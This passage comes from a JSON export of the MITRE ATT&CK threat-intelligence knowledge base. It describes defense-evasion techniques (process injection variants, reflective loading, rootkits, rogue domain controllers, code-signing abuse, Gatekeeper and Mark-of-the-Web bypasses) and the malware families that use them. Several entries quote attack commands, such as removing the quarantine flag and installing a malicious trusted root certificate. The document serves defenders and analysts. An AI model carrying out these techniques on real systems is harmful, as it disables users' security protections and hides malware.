"T1055.013", "examples": [{"id": "S0534", "name": "Bazar", "description": "Bazar can inject into a target process using process doppelg\u00e4nging."}, {"id": "G0077", "name": "Leafminer", "description": "Leafminer has used Process Doppelg\u00e4nging to evade security software while deploying tools on compromised systems."}, {"id": "S0242", "name": "SynAck", "description": "SynAck abuses NTFS transactions to launch and conceal malicious processes."}]}, {"name": "VDSO Hijacking", "description": "Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process.", "detailed_description": "Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process.\nVDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via Ptrace System Calls. However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.", "id": "T1055.014", "examples": []}, {"name": "ListPlanting", "description": "Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process. Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.", "detailed_description": "Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process. Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.\nList-view controls are user interface windows used to display collections of items. Information about an application's list-view settings are stored within the process' memory in a SysListView32 control.\nListPlanting (a form of message-passing \"shatter attack\") may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items. Adversaries must first copy code into the target process\u2019 memory space, which can be performed various ways including by directly obtaining a handle to the SysListView32 child of the victim process window (via Windows API calls such as FindWindow and/or EnumWindows) or other Process Injection methods.\nSome variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitored WriteProcessMemory function. For example, an adversary can use the PostMessage and/or SendMessage API functions to send LVM_SETITEMPOSITION and LVM_GETITEMPOSITION messages, effectively copying a payload 2 bytes at a time to the allocated memory.\nFinally, the payload is triggered by sending the LVM_SORTITEMS message to the SysListView32 child of the process window, with the payload within the newly allocated buffer passed and executed as the ListView_SortItems callback.", "id": "T1055.015", "examples": [{"id": "S0260", "name": "InvisiMole", "description": "InvisiMole has used ListPlanting to inject code into a trusted process."}]}]}, {"name": "Reflective Code Loading", "description": "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., Shared Modules).", "detailed_description": "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., Shared Modules).\nReflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode). For example, the Assembly.Load() method executed by PowerShell may be abused to load raw code into the running process.\nReflective code injection is very similar to Process Injection except that the \"injection\" loads code into the processes\u2019 own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.", "id": "T1620", "examples": [{"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can copy a large byte array of 64-bit shellcode into process memory and execute it with a call to CreateThread."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 has used reflective loading to execute malicious DLLs."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike's execute-assembly command can run a .NET executable within the memory of a sacrificial process by loading the CLR."}, {"id": "S0625", "name": "Cuba", "description": "Cuba loaded the payload into memory using PowerShell."}, {"id": "S0695", "name": "Donut", "description": "Donut can generate code modules that enable in-memory execution of VBScript, JScript, EXE, DLL, and dotNET payloads."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has reflectively loaded payloads into memory."}, {"id": "S0661", "name": "FoggyWeb", "description": "FoggyWeb's loader has reflectively loaded .NET-based assembly/payloads into memory."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium can use custom shellcode to map embedded DLLs into memory."}, {"id": "S1022", "name": "IceApple", "description": "IceApple can use reflective code loading to load .NET assemblies into MSExchangeOWAAppPool on targeted Exchange servers."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used the Invoke-Mimikatz PowerShell script to reflectively load a Mimikatz credential stealing DLL into memory."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has changed memory protection permissions then overwritten in memory DLL function code with shellcode, which was later executed via KernelCallbackTable hijacking. Lazarus Group has also used shellcode within macros to decrypt and manually map DLLs into memory at runtime."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot has reflectively loaded the decoded DLL into memory."}, {"id": "S1143", "name": "LunarLoader", "description": "LunarLoader can use reflective loading to decrypt and run malicious executables in a new thread."}, {"id": "S1059", "name": "metaMain", "description": "metaMain has reflectively loaded a DLL to read, decrypt, and load an orchestrator file."}, {"id": "S1145", "name": "Pikabot", "description": "Pikabot reflectively loads stored, previously encrypted components of the PE file into memory of the currently executing process to avoid writing content to disk on the executing machine."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit reflectively loads a Windows PE file into a process."}, {"id": "S1085", "name": "Sardonic", "description": "Sardonic has a plugin system that can load specially made DLLs into memory and execute their functions."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can run a .NET executable within the memory of a sacrificial process by loading the CLR."}, {"id": "S0595", "name": "ThiefQuest", "description": "ThiefQuest uses various API functions such as NSCreateObjectFileImageFromMemory to load and link in-memory payloads."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos has the ability to load new modules directly into memory using its Load Modules Mem command."}, {"id": "S0689", "name": "WhisperGate", "description": "WhisperGate's downloader can reverse its third stage file bytes and reflectively load the file as a .NET assembly."}], "sub_techniques": []}, {"name": "Rogue Domain Controller", "description": "Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC.  Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.", "detailed_description": "Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC.  Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.\nRegistering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash.\nThis technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors).  The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform SID-History Injection and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence.", "id": "T1207", "examples": [{"id": "S0002", "name": "Mimikatz", "description": "Mimikatz\u2019s LSADUMP::DCShadow module can be used to make AD updates by temporarily setting a computer to be a DC."}], "sub_techniques": []}, {"name": "Rootkit", "description": "Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information.", "detailed_description": "Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. \nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or System Firmware.  Rootkits have been seen for Windows, Linux, and Mac OS X systems.", "id": "T1014", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 has used a UEFI (Unified Extensible Firmware Interface) rootkit known as LoJax."}, {"id": "G0096", "name": "APT41", "description": "APT41 deployed rootkits on Linux systems."}, {"id": "S0484", "name": "Carberp", "description": "Carberp has used user mode rootkit techniques to remain hidden on the system."}, {"id": "S0572", "name": "Caterpillar WebShell", "description": "Caterpillar WebShell has a module to use a rootkit on a system."}, {"id": "S1105", "name": "COATHANGER", "description": "COATHANGER hooks or replaces multiple legitimate processes and other functions on victim devices."}, {"id": "S0502", "name": "Drovorub", "description": "Drovorub has used a kernel module rootkit to hide processes, files, executables, and network artifacts from user space view."}, {"id": "S0377", "name": "Ebury", "description": "Ebury acts as a user land rootkit using the SSH service."}, {"id": "S0047", "name": "Hacking Team UEFI Rootkit", "description": "Hacking Team UEFI Rootkit is a UEFI BIOS rootkit developed by the company Hacking Team to persist remote access software on some targeted systems."}, {"id": "S0394", "name": "HiddenWasp", "description": "HiddenWasp uses a rootkit to hook and implement functions on the system."}, {"id": "S0135", "name": "HIDEDRV", "description": "HIDEDRV is a rootkit that hides certain operating system artifacts."}, {"id": "S0009", "name": "Hikit", "description": "Hikit is a Rootkit that has been used by Axiom. "}, {"id": "S0601", "name": "Hildegard", "description": "Hildegard has modified /etc/ld.so.preload to overwrite readdir() and readdir64()."}, {"id": "S0040", "name": "HTRAN", "description": "HTRAN can install a rootkit to hide network connections from the host OS."}, {"id": "S0397", "name": "LoJax", "description": "LoJax is a UEFI BIOS rootkit deployed to persist remote access software on some targeted systems."}, {"id": "S0012", "name": "PoisonIvy", "description": "PoisonIvy starts a rootkit from a malicious file dropped to disk."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay has included a rootkit to evade defenses."}, {"id": "G0106", "name": "Rocke", "description": "Rocke has modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists."}, {"id": "S0468", "name": "Skidmap", "description": "Skidmap is a kernel-mode rootkit that has the ability to hook system calls to hide specific files and fake network and CPU-related statistics to make the CPU load of the infected machine always appear low."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet uses a Windows rootkit to mask its binaries and other relevant files."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has used rootkits such as the open-source Diamorphine rootkit and their custom bots to hide cryptocurrency mining activities on the machine. "}, {"id": "S0221", "name": "Umbreon", "description": "Umbreon hides from defenders by hooking libc function calls, hiding artifacts that would reveal its presence, such as the user account it creates to provide access and undermining strace, a tool often used to identify malware."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos can use its kernel module to prevent its host components from being listed by the targeted system's OS and to mediate requests between user mode and concealed components."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT can include a rootkit to hide processes, files, and startup."}, {"id": "S0430", "name": "Winnti for Linux", "description": "Winnti for Linux has used a modified copy of the open-source userland rootkit Azazel, named libxselinux.so, to hide the malware's operations and network activity."}, {"id": "G0044", "name": "Winnti Group", "description": "Winnti Group used a rootkit to modify typical server functionality."}, {"id": "S0027", "name": "Zeroaccess", "description": "Zeroaccess is a kernel-mode rootkit."}], "sub_techniques": []}, {"name": "Subvert Trust Controls", "description": "Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.", "detailed_description": "Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.\nAdversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct File and Directory Permissions Modification or Modify Registry in support of subverting these controls. Adversaries may also create or steal code signing certificates to acquire trust on target systems.", "id": "T1553", "examples": [{"id": "G0001", "name": "Axiom", "description": "Axiom has used digital certificates to deliver malware."}], "sub_techniques": [{"name": "Gatekeeper Bypass", "description": "Adversaries may modify file attributes and subvert Gatekeeper functionality to evade user prompts and execute untrusted programs. Gatekeeper is a set of technologies that act as layer of Apple\u2019s security model to ensure only trusted applications are executed on a host. Gatekeeper was built on top of File Quarantine in Snow Leopard (10.6, 2009) and has grown to include Code Signing, security policy compliance, Notarization, and more. Gatekeeper also treats applications running for the first time differently than reopened applications.", "detailed_description": "Adversaries may modify file attributes and subvert Gatekeeper functionality to evade user prompts and execute untrusted programs. Gatekeeper is a set of technologies that act as layer of Apple\u2019s security model to ensure only trusted applications are executed on a host. Gatekeeper was built on top of File Quarantine in Snow Leopard (10.6, 2009) and has grown to include Code Signing, security policy compliance, Notarization, and more. Gatekeeper also treats applications running for the first time differently than reopened applications.\nBased on an opt-in system, when files are downloaded an extended attribute (xattr) called com.apple.quarantine (also known as a quarantine flag) can be set on the file by the application performing the download. Launch Services opens the application in a suspended state. For first run applications with the quarantine flag set, Gatekeeper executes the following functions:\nChecks extended attribute \u2013 Gatekeeper checks for the quarantine flag, then provides an alert prompt to the user to allow or deny execution.\nChecks System Policies - Gatekeeper checks the system security policy, allowing execution of apps downloaded from either just the App Store or the App Store and identified developers.\nCode Signing \u2013 Gatekeeper checks for a valid code signature from an Apple Developer ID.\nNotarization - Using the api.apple-cloudkit.com API, Gatekeeper reaches out to Apple servers to verify or pull down the notarization ticket and ensure the ticket is not revoked. Users can override notarization, which will result in a prompt of executing an \"unauthorized app\" and the security policy will be modified.\nAdversaries can subvert one or multiple security controls within Gatekeeper checks through logic errors (e.g. Exploitation for Defense Evasion), unchecked file types, and external libraries. For example, prior to macOS 13 Ventura, code signing and notarization checks were only conducted on first launch, allowing adversaries to write malicious executables to previously opened applications in order to bypass Gatekeeper security checks.\nApplications and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the curl command may not set the quarantine flag. Additionally, it is possible to avoid setting the quarantine flag using Drive-by Compromise.", "id": "T1553.001", "examples": [{"id": "S0369", "name": "CoinTicker", "description": "CoinTicker downloads the EggShell mach-o binary using curl, which does not set the quarantine flag."}, {"id": "S1153", "name": "Cuckoo Stealer", "description": "Cuckoo Stealer can use xattr -d com.apple.quarantine to remove the quarantine flag attribute."}, {"id": "S1016", "name": "MacMa", "description": "MacMa has removed the com.apple.quarantineattribute from the dropped file, $TMPDIR/airportpaird."}, {"id": "S0402", "name": "OSX/Shlayer", "description": "If running with elevated privileges, OSX/Shlayer has used the spctl command to disable Gatekeeper protection for a downloaded file. OSX/Shlayer can also leverage system links pointing to bash scripts in the downloaded DMG file to bypass Gatekeeper, a flaw patched in macOS 11.3 and later versions. OSX/Shlayer has been Notarized by Apple, resulting in successful passing of additional Gatekeeper checks."}, {"id": "S0352", "name": "OSX_OCEANLOTUS.D", "description": "OSX_OCEANLOTUS.D uses the command xattr -d com.apple.quarantine to remove the quarantine file attribute used by Gatekeeper."}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET has dropped a malicious applet into an app's .../Contents/MacOS/ folder of a previously launched app to bypass Gatekeeper's security checks on first launch apps (prior to macOS 13)."}]}, {"name": "Code Signing", "description": "Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with.  The certificates used during an operation may be created, acquired, or stolen by the adversary.   Unlike Invalid Code Signature, this activity will result in a valid signature.", "detailed_description": "Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with.  The certificates used during an operation may be created, acquired, or stolen by the adversary.   Unlike Invalid Code Signature, this activity will result in a valid signature.\nCode signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform.\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system.", "id": "T1553.002", "examples": [{"id": "S0504", "name": "Anchor", "description": "Anchor has been signed with valid certificates to evade detection by security tools."}, {"id": "S0584", "name": "AppleJeus", "description": "AppleJeus has used a valid digital signature from Sectigo to appear legitimate."}, {"id": "G0096", "name": "APT41", "description": "APT41 leveraged code-signing certificates to sign malware when targeting both gaming and non-gaming organizations."}, {"id": "C0040", "name": "APT41 DUST", "description": "APT41 DUST used stolen code signing certificates for DUSTTRAP malware and subsequent payloads."}, {"id": "S0475", "name": "BackConfig", "description": "BackConfig has been signed with self signed digital certificates mimicking a legitimate software company."}, {"id": "S0234", "name": "Bandook", "description": "Bandook was signed with valid Certum certificates."}, {"id": "S0534", "name": "Bazar", "description": "Bazar has been signed with fake certificates including those appearing to be from VB CORPORATE PTY. LTD."}, {"id": "S1070", "name": "Black Basta", "description": "The Black Basta dropper has been digitally signed with a certificate issued by Akeo Consulting for legitimate executables used for creating bootable USB drives."}, {"id": "S0520", "name": "BLINDINGCAN", "description": "BLINDINGCAN has been signed with code-signing certificates such as CodeRipper."}, {"id": "S0415", "name": "BOOSTWRITE", "description": "BOOSTWRITE has been signed by a valid CA."}, {"id": "C0015", "name": "C0015", "description": "For C0015, the threat actors used DLL files that had invalid certificates."}, {"id": "S0144", "name": "ChChes", "description": "ChChes samples were digitally signed with a certificate originally used by Hacking Team that was later leaked and subsequently revoked."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP has been dropped by a self-extracting archive signed with a valid digital certificate."}, {"id": "S0611", "name": "Clop", "description": "Clop can use code signing to evade detection."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can use self signed Java applets to execute signed applet attacks."}, {"id": "G0052", "name": "CopyKittens", "description": "CopyKittens digitally signed an executable with a stolen certificate from legitimate company AI Squared."}, {"id": "S0527", "name": "CSPY Downloader", "description": "CSPY Downloader has come signed with revoked certificates."}, {"id": "G1034", "name": "Daggerfly", "description": "Daggerfly has used signed, but not notarized, malicious files for execution in macOS environments."}, {"id": "G0012", "name": "Darkhotel", "description": "Darkhotel has used code-signing certificates on its malware that are either forged due to weak keys or stolen. Darkhotel has also stolen certificates and signed backdoors and downloaders with them."}, {"id": "S0187", "name": "Daserf", "description": "Some Daserf samples were signed with a stolen digital certificate."}, {"id": "S0377", "name": "Ebury", "description": "Ebury has installed a self-signed RPM package mimicking the original system package on RPM based systems."}, {"id": "S0624", "name": "Ecipekac", "description": "Ecipekac has used a valid, legitimate digital signature to evade detection."}, {"id": "S0091", "name": "Epic", "description": "Turla has used valid digital certificates from Sysprint AG to sign its Epic dropper."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has used Comodo code-signing certificates."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has signed Carbanak payloads with legally purchased code signing certificates. FIN7 has also digitally signed their phishing documents, backdoors and other staging tools to bypass security controls."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM has used stolen certificates to sign its tools including those from Whizzimo LLC."}, {"id": "S0168", "name": "Gazer", "description": "Gazer versions are signed with various valid certificates; one was likely faked and issued by Comodo for \"Solid Loop Ltd,\" and another was issued for \"Ultimate Computer Support Ltd.\""}, {"id": "S0342", "name": "GreyEnergy", "description": "GreyEnergy digitally signs the malware with a code-signing certificate."}, {"id": "S0170", "name": "Helminth", "description": "Helminth samples have been signed with legitimate, compromised code signing certificates owned by software company AI Squared."}, {"id": "S0697", "name": "HermeticWiper", "description": "The HermeticWiper executable has been signed with a legitimate certificate issued to Hermetica Digital Ltd."}, {"id": "S0698", "name": "HermeticWizard", "description": "HermeticWizard has been signed by valid certificates assigned to Hermetica Digital."}, {"id": "S0163", "name": "Janicab", "description": "Janicab used a valid AppleDeveloperID to sign the code to get past security restrictions."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has signed files with the name EGIS CO,. Ltd.."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has digitally signed malware and utilities to evade detection."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has used stolen code signing certificates to sign malware."}, {"id": "S0372", "name": "LockerGoga", "description": "LockerGoga has been signed with stolen certificates in order to make it look more legitimate."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has signed their malware with a valid digital signature."}, {"id": "S1016", "name": "MacMa", "description": "MacMa has been delivered using ad hoc Apple Developer code signing certificates."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has resized and added data to the certificate table to enable the signing of modified files with legitimate signatures."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has digitally signed executables using AVAST Software certificates."}, {"id": "G0021", "name": "Molerats", "description": "Molerats has used forged Microsoft code-signing certificates on malware."}, {"id": "S0284", "name": "More_eggs", "description": "More_eggs has used a signed binary shellcode loader and a signed Dynamic Link Library (DLL) to create a reverse shell."}, {"id": "G1009", "name": "Moses Staff", "description": "Moses Staff has used signed drivers from an open source tool called DiskCryptor to evade detection."}, {"id": "S0210", "name": "Nerex", "description": "Nerex drops a signed Microsoft DLL to disk."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group digitally signed their own malware to evade detection."}, {"id": "C0006", "name": "Operation Honeybee", "description": "During Operation Honeybee, the threat actors deployed the MaoCheng dropper with a stolen Adobe Systems digital signature."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork has signed malware with self-signed certificates from fictitious and spoofed legitimate software companies."}, {"id": "S0501", "name": "PipeMon", "description": "PipeMon, its installer, and tools are signed with stolen code-signing certificates."}, {"id": "G0056", "name": "PROMETHIUM", "description": "PROMETHIUM has signed code with self-signed certificates."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can use signed loaders to evade detection."}, {"id": "S0262", "name": "QuasarRAT", "description": "A QuasarRAT .dll file is digitally signed by a certificate from AirVPN."}, {"id": "S1150", "name": "ROADSWEEP", "description": "ROADSWEEP has been digitally signed with a certificate issued to the Kuwait Telecommunications Company KSC."}, {"id": "S0148", "name": "RTM", "description": "RTM samples have been signed with a code-signing certificates."}, {"id": "G1031", "name": "Saint Bear", "description": "Saint Bear has used an initial loader malware featuring a legitimate code signing certificate associated with \"Electrum Technologies GmbH.\""}, {"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider has used self-signed and stolen certificates originally issued to NVIDIA and Global Software LLC."}, {"id": "G0091", "name": "Silence", "description": "Silence has used a valid certificate to sign their primary loader Silence.Downloader (aka TrueBot)."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 was able to get SUNBURST signed by SolarWinds code signing certificates by injecting the malware into the SolarWinds Orion software lifecycle."}, {"id": "S0646", "name": "SpicyOmelette", "description": "SpicyOmelette has been signed with valid digital certificates."}, {"id": "S0491", "name": "StrongPity", "description": "StrongPity has been signed with self-signed certificates."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet used a digitally signed driver with a compromised Realtek certificate."}, {"id": "G0039", "name": "Suckfly", "description": "Suckfly has used stolen certificates to sign its malware."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST was digitally signed by SolarWinds from March - May 2020."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate has been signed with stolen digital certificates."}, {"id": "G0092", "name": "TA505", "description": "TA505 has signed payloads with code signing certificates from Thawte and Sectigo."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot has come with a signed downloader component."}, {"id": "G0044", "name": "Winnti Group", "description": "Winnti Group used stolen certificates to sign its malware."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used Digicert code-signing certificates for some of its malware."}, {"id": "S1151", "name": "ZeroCleare", "description": "ZeroCleare can deploy a vulnerable, signed driver on a compromised host to bypass operating system safeguards."}]}, {"name": "SIP and Trust Provider Hijacking", "description": "Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode  digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,   which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. ", "detailed_description": "Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode  digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,   which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. \nBecause of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs)  to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  ) and are identified by globally unique identifiers (GUIDs).\nSimilar to Code Signing, adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by:\nHijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation.", "id": "T1553.003", "examples": []}, {"name": "Install Root Certificate", "description": "Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.", "detailed_description": "Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide Adversary-in-the-Middle capability for intercepting information transmitted over secure TLS/SSL communications.\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.\nIn macOS, the Ay MaMi malware uses /usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert to install a malicious certificate as a trusted root certificate into the system keychain.", "id": "T1553.004", "examples": [{"id": "S0160", "name": "certutil", "description": "certutil can be used to install browser root certificates as a precursor to performing Adversary-in-the-Middle between connections to banking websites. Example command: certutil -addstore -f -user ROOT ProgramData\\cert512121.der."}, {"id": "S0281", "name": "Dok", "description": "Dok installs a root certificate to aid in Adversary-in-the-Middle actions using the command add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /tmp/filename."}, {"id": "S0009", "name": "Hikit", "description": "Hikit installs a self-generated certificate to the local trust store as a root CA and Trusted Publisher."}, {"id": "S0148", "name": "RTM", "description": "RTM can add a certificate to the Windows store."}]}, {"name": "Mark-of-the-Web Bypass", "description": "Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named Zone.Identifier with a specific value known as the MOTW. Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file is not known/trusted, SmartScreen will prevent the execution and warn the user not to run it.", "detailed_description": "Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named Zone.Identifier with a specific value known as the MOTW. Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file is not known/trusted, SmartScreen will prevent the execution and warn the user not to run it.\nAdversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted. MOTW is a NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections.", "id": "T1553.005", "examples": [{"id": "S1025", "name": "Amadey", "description": "Amadey has modified the :Zone.Identifier in the ADS area to zero."}, {"id": "G0016", "name": "APT29", "description": "APT29 has embedded ISO images and VHDX files in HTML to evade Mark-of-the-Web."}, {"id": "S0650", "name": "QakBot", "description": "QakBot has been packaged in ISO files in order to bypass Mark of the Web (MOTW) security measures."}, {"id": "G0092", "name": "TA505", "description": "TA505 has used 